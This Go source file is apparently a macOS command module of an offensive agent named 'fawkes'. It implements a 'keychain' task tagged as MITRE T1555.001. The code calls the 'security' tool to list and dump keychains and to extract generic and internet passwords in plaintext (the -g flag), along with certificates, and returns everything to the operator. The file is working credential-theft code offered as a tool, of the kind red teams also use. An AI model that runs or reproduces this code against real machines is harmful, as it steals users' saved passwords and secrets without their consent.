//go:build darwin

package commands

import (
	"encoding/json"
	"fmt"
	"os/exec"
	"strings"

	"fawkes/pkg/structs"
)

// KeychainCommand implements macOS keychain access via the security CLI
type KeychainCommand struct{}

func (c *KeychainCommand) Name() string {
	return "keychain"
}

func (c *KeychainCommand) Description() string {
	return "Access macOS Keychain items — list keychains, dump metadata, find passwords and certificates (T1555.001)"
}

type keychainArgs struct {
	Action  string `json:"action"`
	Service string `json:"service"`
	Account string `json:"account"`
	Server  string `json:"server"`
	Label   string `json:"label"`
	Name    string `json:"name"`
}

func (c *KeychainCommand) Execute(task structs.Task) structs.CommandResult {
	var args keychainArgs

	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Actions: list, dump, find-password, find-internet, find-cert",
			Status:    "error",
			Completed: true,
		}
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return keychainList()
	case "dump":
		return keychainDump()
	case "find-password":
		return keychainFindGeneric(args)
	case "find-internet":
		return keychainFindInternet(args)
	case "find-cert":
		return keychainFindCert(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: list, dump, find-password, find-internet, find-cert", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// keychainList enumerates available keychains
func keychainList() structs.CommandResult {
	out, err := exec.Command("security", "list-keychains").CombinedOutput()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error listing keychains: %v\n%s", err, string(out)),
			Status:    "error",
			Completed: true,
		}
	}

	// Also get default and login keychain info
	defKc, _ := exec.Command("security", "default-keychain").CombinedOutput()
	loginKc, _ := exec.Command("security", "login-keychain").CombinedOutput()

	var sb strings.Builder
	sb.WriteString("=== macOS Keychains ===\n\n")
	sb.WriteString("Search list:\n")
	sb.WriteString(string(out))
	sb.WriteString("\nDefault keychain: ")
	sb.WriteString(strings.TrimSpace(string(defKc)))
	sb.WriteString("\nLogin keychain:  ")
	sb.WriteString(strings.TrimSpace(string(loginKc)))

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// keychainDump dumps keychain metadata (no passwords without -g flag)
func keychainDump() structs.CommandResult {
	out, err := exec.Command("security", "dump-keychain").CombinedOutput()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error dumping keychain: %v\n%s", err, string(out)),
			Status:    "error",
			Completed: true,
		}
	}

	output := string(out)
	if len(output) > 500000 {
		output = output[:500000] + "\n\n[OUTPUT TRUNCATED — keychain dump exceeded 500KB]"
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

// keychainFindGeneric searches for generic password items
func keychainFindGeneric(args keychainArgs) structs.CommandResult {
	cmdArgs := []string{"find-generic-password", "-g"}

	if args.Service != "" {
		cmdArgs = append(cmdArgs, "-s", args.Service)
	}
	if args.Account != "" {
		cmdArgs = append(cmdArgs, "-a", args.Account)
	}
	if args.Label != "" {
		cmdArgs = append(cmdArgs, "-l", args.Label)
	}

	// If no filters specified, inform user
	if args.Service == "" && args.Account == "" && args.Label == "" {
		return structs.CommandResult{
			Output:    "Error: specify at least one filter: service, account, or label\nExample: keychain -action find-password -service \"Wi-Fi\"",
			Status:    "error",
			Completed: true,
		}
	}

	out, err := exec.Command("security", cmdArgs...).CombinedOutput()
	if err != nil {
		// security returns exit code 44 when item not found
		output := string(out)
		if strings.Contains(output, "could not be found") || strings.Contains(output, "SecKeychainSearchCopyNext") {
			return structs.CommandResult{
				Output:    "No matching generic password found",
				Status:    "success",
				Completed: true,
			}
		}
		// Access denied or keychain locked
		if strings.Contains(output, "User interaction is not allowed") || strings.Contains(output, "authorization denied") {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Access denied — keychain may be locked or user authorization required\n%s", output),
				Status:    "error",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v\n%s", err, output),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    string(out),
		Status:    "success",
		Completed: true,
	}
}

// keychainFindInternet searches for internet password items
func keychainFindInternet(args keychainArgs) structs.CommandResult {
	cmdArgs := []string{"find-internet-password", "-g"}

	if args.Server != "" {
		cmdArgs = append(cmdArgs, "-s", args.Server)
	}
	if args.Account != "" {
		cmdArgs = append(cmdArgs, "-a", args.Account)
	}
	if args.Label != "" {
		cmdArgs = append(cmdArgs, "-l", args.Label)
	}

	// If no filters specified, inform user
	if args.Server == "" && args.Account == "" && args.Label == "" {
		return structs.CommandResult{
			Output:    "Error: specify at least one filter: server, account, or label\nExample: keychain -action find-internet -server \"github.com\"",
			Status:    "error",
			Completed: true,
		}
	}

	out, err := exec.Command("security", cmdArgs...).CombinedOutput()
	if err != nil {
		output := string(out)
		if strings.Contains(output, "could not be found") || strings.Contains(output, "SecKeychainSearchCopyNext") {
			return structs.CommandResult{
				Output:    "No matching internet password found",
				Status:    "success",
				Completed: true,
			}
		}
		if strings.Contains(output, "User interaction is not allowed") || strings.Contains(output, "authorization denied") {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Access denied — keychain may be locked or user authorization required\n%s", output),
				Status:    "error",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v\n%s", err, output),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    string(out),
		Status:    "success",
		Completed: true,
	}
}

// keychainFindCert searches for certificates in keychains
func keychainFindCert(args keychainArgs) structs.CommandResult {
	cmdArgs := []string{"find-certificate", "-a", "-Z"}

	if args.Name != "" {
		cmdArgs = append(cmdArgs, "-c", args.Name)
	}

	out, err := exec.Command("security", cmdArgs...).CombinedOutput()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error finding certificates: %v\n%s", err, string(out)),
			Status:    "error",
			Completed: true,
		}
	}

	output := string(out)
	if len(output) > 500000 {
		output = output[:500000] + "\n\n[OUTPUT TRUNCATED — certificate list exceeded 500KB]"
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}
